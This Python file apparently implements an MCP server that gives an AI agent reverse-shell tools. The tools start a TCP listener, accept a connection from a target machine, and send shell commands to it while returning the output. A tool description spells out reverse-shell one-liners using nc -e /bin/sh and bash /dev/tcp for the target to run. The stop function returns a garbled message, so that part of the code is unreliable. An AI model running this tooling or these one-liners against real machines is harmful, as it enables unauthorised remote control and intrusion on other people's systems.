#!/usr/bin/env python3
"""
Reverse Shell MCP Server - Reverse Shell MCP Service

Exposes reverse shell capabilities via MCP protocol: start/stop listening, interact with connected clients and execute commands.
No need to modify Pyntra backend, simply add via stdio method in "Settings → External MCP".

Dependencies: pip install mcp (or use project venv)
Run: python mcp_reverse_shell.py or python3 mcp_reverse_shell.py
"""

from __future__ import annotations

import asyncio
import socket
import threading
import time
from typing import Any

from mcp.server.fastmcp import FastMCP

# ---------------------------------------------------------------------------
# Reverse Shell State (Singleton: one listener, one connected client)
# ---------------------------------------------------------------------------

_LISTENER: socket.socket | None = None
_LISTENER_THREAD: threading.Thread | None = None
_LISTENER_PORT: int | None = None
_CLIENT_SOCK: socket.socket | None = None
_CLIENT_ADDR: tuple[str, int] | None = None
_LOCK = threading.Lock()
_STOP_EVENT = threading.Event()
_READY_EVENT = threading.Event()
_LAST_LISTEN_ERROR: str | None = None
_LISTENER_THREAD_JOIN_TIMEOUT = 1.0
_START_READY_TIMEOUT = 1.5

# Output end marker for send_command (avoid infinite waiting)
_END_MARKER = "__RS_DONE__"
_RECV_TIMEOUT = 30.0
_RECV_CHUNK = 4096

def _get_local_ips() -> list[str]:
 """Get local IP list (for target reverse connections), prioritize non-127 addresses."""
 ips: list[str] = []
 try:
 s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 s.connect(("8.8.8.8", 80))
 ip = s.getsockname()[0]
 s.close()
 if ip and ip != "127.0.0.1":
 ips.append(ip)
 except OSError:
 pass
 if not ips:
 try:
 ip = socket.gethostbyname(socket.gethostname())
 if ip:
 ips.append(ip)
 except OSError:
 pass
 if not ips:
 ips.append("127.0.0.1")
 return ips

def _accept_loop(port: int) -> None:
 """In background thread: bind, listen, accept, only accept one client."""
 global _LISTENER, _CLIENT_SOCK, _CLIENT_ADDR, _LISTENER_PORT, _LAST_LISTEN_ERROR
 sock: socket.socket | None = None
 try:
 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 sock.bind(("0.0.0.0", port))
 sock.listen(1)
 # Avoid accept() hanging for long after stop_listener closes: use timeout polling to check stop event
 sock.settimeout(0.5)
 with _LOCK:
 _LISTENER = sock
 _LISTENER_PORT = port
 _LAST_LISTEN_ERROR = None
 _READY_EVENT.set()
 # Loop accept: accept only one connection, or wait for stop event
 while not _STOP_EVENT.is_set():
 try:
 client, addr = sock.accept()
 except socket.timeout:
 continue
 except OSError:
 break
 with _LOCK:
 _CLIENT_SOCK = client
 _CLIENT_ADDR = (addr[0], addr[1])
 break
 except OSError as e:
 with _LOCK:
 _LAST_LISTEN_ERROR = str(e)
 _READY_EVENT.set()
 finally:
 with _LOCK:
 _LISTENER = None
 _LISTENER_PORT = None
 if sock is not None:
 try:
 sock.close()
 except OSError:
 pass

def _start_listener(port: int) -> str:
 global _LISTENER_THREAD, _LISTENER_PORT, _CLIENT_SOCK, _CLIENT_ADDR, _LAST_LISTEN_ERROR
 old_thread: threading.Thread | None = None
 with _LOCK:
 if _LISTENER is not None:
 # _LISTENER_PORT may briefly be None (e.g., just after stop/start), so provide fallback display
 show_port = _LISTENER_PORT if _LISTENER_PORT is not None else port
 return f"Already listening (port: {show_port}), please stop_listener first then restart."
 if _CLIENT_SOCK is not None:
 try:
 _CLIENT_SOCK.close()
 except OSError:
 pass
 _CLIENT_SOCK = None
 _CLIENT_ADDR = None
 old_thread = _LISTENER_THREAD

 # If old thread hasn't fully exited yet, wait briefly to reduce port binding failure probability
 if old_thread is not None and old_thread.is_alive():
 old_thread.join(timeout=0.5)

 _STOP_EVENT.clear()
 _READY_EVENT.clear()
 _LAST_LISTEN_ERROR = None
 th = threading.Thread(target=_accept_loop, args=(port,), daemon=True)
 th.start()
 _LISTENER_THREAD = th

 # Wait for background thread to complete bind/listen (or fail)
 _READY_EVENT.wait(timeout=_START_READY_TIMEOUT)
 with _LOCK:
 err = _LAST_LISTEN_ERROR
 listening = _LISTENER is not None

 if listening:
 ips = _get_local_ips()
 addrs = ", ".join(f"{ip}:{port}" for ip in ips)
 return (
 f"Started listening on 0.0.0.0:{port}. "
 f"Target should reverse connect to: {addrs} (choose one). After connecting, use reverse_shell_send_command to execute commands."
 )

 if err:
 return f"Failed to start listener (0.0.0.0:{port}): {err}"

 # Still not ready: may be slow thread scheduling or environment issues; provide actionable hint
 return f"Listener startup not confirmed (0.0.0.0:{port}). Call reverse_shell_status to confirm, or retry later."

def _stop_listener() -> str:
 global _LISTENER, _LISTENER_THREAD, _CLIENT_SOCK, _CLIENT_ADDR, _LISTENER_PORT
 listener_sock: socket.socket | None = None
 client_sock: socket.socket | None = None
 old_thread: threading.Thread | None = None
 with _LOCK:
 _STOP_EVENT.set()
 _READY_EVENT.set()
 listener_sock = _LISTENER
 old_thread = _LISTENER_THREAD
 _LISTENER = None
 _LISTENER_PORT = None
 client_sock = _CLIENT_SOCK
 _CLIENT_SOCK = None
 _CLIENT_ADDR = None

 if listener_sock is not None:
 try:
 listener_sock.close()
 except OSError:
 pass
 if client_sock is not None:
 try:
 client_sock.close()
 except OSError:
 pass
 if old_thread is not None and old_thread.is_alive():
 old_thread.join(timeout=_LISTENER_THREAD_JOIN_TIMEOUT)
 with _LOCK:
 _LISTENER_THREAD = None
 return ",current()."

def _disconnect_client() -> str:
 global _CLIENT_SOCK, _CLIENT_ADDR
 with _LOCK:
 if _CLIENT_SOCK is None:
 return "No connected client currently."
 try:
 _CLIENT_SOCK.close()
 except OSError:
 pass
 addr = _CLIENT_ADDR
 _CLIENT_SOCK = None
 _CLIENT_ADDR = None
 return f"Disconnected client {addr}."

def _status() -> dict[str, Any]:
 with _LOCK:
 listening = _LISTENER is not None
 port = _LISTENER_PORT
 connected = _CLIENT_SOCK is not None
 addr = _CLIENT_ADDR
 connect_back = None
 if listening and port is not None:
 ips = _get_local_ips()
 connect_back = [f"{ip}:{port}" for ip in ips]
 return {
 "listening": listening,
 "port": port,
 "connect_back": connect_back,
 "connected": connected,
 "client_address": f"{addr[0]}:{addr[1]}" if addr else None,
 }

def _send_command_blocking(command: str, timeout: float = _RECV_TIMEOUT) -> str:
 """Send command to connected client and read output in sync context (with end marker)."""
 global _CLIENT_SOCK, _CLIENT_ADDR
 with _LOCK:
 client = _CLIENT_SOCK
 if client is None:
 return "Error: No connected client currently. Please start_listener first, wait for target connection, then send_command."
 # Use end marker to reliably truncate output
 wrapped = f"{command.strip()}\necho {_END_MARKER}\n"
 try:
 client.settimeout(timeout)
 client.sendall(wrapped.encode("utf-8", errors="replace"))
 data = b""
 while True:
 try:
 chunk = client.recv(_RECV_CHUNK)
 if not chunk:
 break
 data += chunk
 if _END_MARKER.encode() in data:
 break
 except socket.timeout:
 break
 text = data.decode("utf-8", errors="replace")
 if _END_MARKER in text:
 text = text.split(_END_MARKER)[0].strip()
 return text or "(No output)"
 except (ConnectionResetError, BrokenPipeError, OSError) as e:
 with _LOCK:
 if _CLIENT_SOCK is client:
 _CLIENT_SOCK = None
 _CLIENT_ADDR = None
 return f"Connection disconnected: {e}"
 except Exception as e:
 return f"Execution exception: {e}"

# ---------------------------------------------------------------------------
# MCP Service and Tools
# ---------------------------------------------------------------------------

app = FastMCP(
 name="reverse-shell",
 instructions="Reverse Shell MCP: Start TCP listener locally, execute commands via tools after target connects.",
)

@app.tool(
 description="Start reverse shell listener on specified port. Target must execute reverse connection (e.g. nc -e /bin/sh YOUR_IP PORT or bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1). Supports only one listener and one client.",
)
def reverse_shell_start_listener(port: int) -> str:
 """Start reverse shell listener on the given port (e.g. 4444)."""
 if port < 1 or port > 65535:
 return "Port must be between 1 and 65535."
 return _start_listener(port)

@app.tool(
 description="Stop reverse shell listener and disconnect current client.",
)
def reverse_shell_stop_listener() -> str:
 """Stop the listener and disconnect the current client."""
 return _stop_listener()

@app.tool(
 description="View current status: whether listening, port, whether client connected, and client address.",
)
def reverse_shell_status() -> str:
 """Get listener and client connection status."""
 s = _status()
 lines = [
 f"Listening: {s['listening']}",
 f"Port: {s['port']}",
 f"Reverse address (target connects to): {', '.join(s['connect_back']) if s.get('connect_back') else '-'}",
 f"Connected: {s['connected']}",
 f"Client: {s['client_address'] or '-'}",
 ]
 return "\n".join(lines)

@app.tool(
 description="Send a command to connected reverse shell client and return output. If not connected, first start_listener and wait for target connection.",
)
async def reverse_shell_send_command(command: str) -> str:
 """Send a command to the connected reverse shell client and return output."""
 # Execute blocking socket I/O in thread pool to avoid long occupation of MCP main thread, allowing status/stop_listener etc. to respond
 return await asyncio.to_thread(_send_command_blocking, command)

@app.tool(
 description="Only disconnect current client, do not stop listener (can continue waiting for new connections).",
)
def reverse_shell_disconnect() -> str:
 """Disconnect the current client without stopping the listener."""
 return _disconnect_client()

if __name__ == "__main__":
 app.run(transport="stdio")
